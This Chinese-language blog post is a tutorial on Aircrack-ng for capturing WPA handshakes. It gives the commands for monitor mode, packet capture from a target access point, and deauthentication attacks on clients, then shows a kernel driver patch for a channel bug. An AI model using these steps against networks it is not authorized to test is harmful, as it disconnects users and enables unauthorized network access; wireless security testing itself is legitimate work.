---
layout: post
title: "学习如何使用Aircrack-ng"
description: ""
category: Tools&Apps
tags: [aircrack, wpa]
---
{% include JB/setup %}

最近需要wpa密码破解，所以简单学习了下Aircrack-ng。

Aircrack-ng是个具有较多功能的密码破解工具，例如airmon-ng 用于监控网卡，airodump-ng用于抓取数据包，aireplay-ng用于发包等等。

###aricrack-ng 使用

需要开启网卡的混杂模式用于监听，首先查看网络接口

	sudo ifconfig

比如，无线接口为` wlan1 `，则使用其来扫描和监控。开启` wlan1 `

	sudo ifconfig wlan1 up

扫描范围内的AP

	sudo iwlist wlan1 scan

开启` wlan1 `的混杂监听模式

	sudo airmon-ng start wlan1

通常会新建一个新的监听接口，叫做` mon0 `，如果当前存在` mon0 `则会数字累加，继续生成如` mon1 `等新的接口。可以通过

	sudo airmon-ng 

来查看是否新建` mon0 `成功。

之后使用` airodump-ng `进行抓包。

	sudo airodump-ng --bssid 目标AP的MAC（XX:XX:XX:XX:XX:XX） --channel 目标AP信道（例如11） -w wap mon0

其中的` -w `选项为保存数据包的命名，可以随意。

再开启一个终端，使用` aireplay-ng `来发包。

	sudo aireplay-ng -0 3 -a 目标AP的MAC（XX:XX:XX:XX:XX:XX） -c 目的客户端的MAC(XX:XX:XX:XX:XX:XX) mon0

其中` -0 3`为发送3次断开连接的命令，等同于` --deauth=3 `。

这样，在之前的` airodump-ng `的终端，可以看到` wpa handshake `的提示，说明抓到四次握手的数据包，可以进行下一步的破解了。

###Bug&Patch

在使用` aireplay-ng `发送deauth数据包的时候,可能会遇到channel 为 -1的BUG，这样会导致信道与目标AP 不符，从而无法收到四次握手的过程.

	wget http://wireless.kernel.org/download/compat-wireless-2.6/compat-wireless-2012-04-26.tar.bz2
	tar -jxf compat-wireless-2012-04-26.tar.bz2
	cd compat-wireless-2012-04-26
	
	wget http://patches.aircrack-ng.org/mac80211.compat08082009.wl_frag+ack_v1.patch
	patch -p1 < mac80211.compat08082009.wl_frag+ack_v1.patch
	wget http://patches.aircrack-ng.org/channel-negative-one-maxim.patch
	patch ./net/wireless/chan.c channel-negative-one-maxim.patch
	
	make
	sudo make install
	sudo make unload
	sudo reboot
  
之后就可以正常使用了。
